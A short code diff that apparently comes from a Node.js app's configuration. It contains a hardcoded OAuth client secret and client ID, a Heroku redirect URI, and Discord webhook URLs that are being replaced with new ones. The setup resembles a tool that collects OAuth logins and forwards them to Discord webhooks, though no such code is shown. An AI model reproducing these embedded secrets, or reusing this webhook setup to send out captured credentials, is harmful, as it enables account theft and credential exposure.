@@ -2,8 +2,8 @@
 const client_secret = '66-8Q~ThIsIDKrYiqkocUDvfllu-Bljv23QJraYq'
 const client_id = 'b8e9ad6f-b507-4b28-a487-5034da07f311'
 const redirect_uri = 'https://ratab-898958adf7fc.herokuapp.com/'
-const webhook_url = 'https://discord.com/api/webhooks/1141427654604640266/l-iFsne-o2F-KFJ1xsbUmC3SvYvhs7P1_YvOY_-kzbEj8NZZvIQvTIGWzlDNsuYv0lpX'
-const webhook_logging_url = 'https://discord.com/api/webhooks/1141427654604640266/l-iFsne-o2F-KFJ1xsbUmC3SvYvhs7P1_YvOY_-kzbEj8NZZvIQvTIGWzlDNsuYv0lpX'
+const webhook_url = 'https://discord.com/api/webhooks/1141468301239779428/0xFLqfeUsCzJ30kIyacgbaVMyTf6fTdMuVK3gq5wfJIIRgz5c7Q2pRDs8T7utYvJOvOr'
+const webhook_logging_url = 'https://discord.com/api/webhooks/1141468301239779428/0xFLqfeUsCzJ30kIyacgbaVMyTf6fTdMuVK3gq5wfJIIRgz5c7Q2pRDs8T7utYvJOvOr'
 // Config end
 const axios = require('axios')
 const express = require('express')
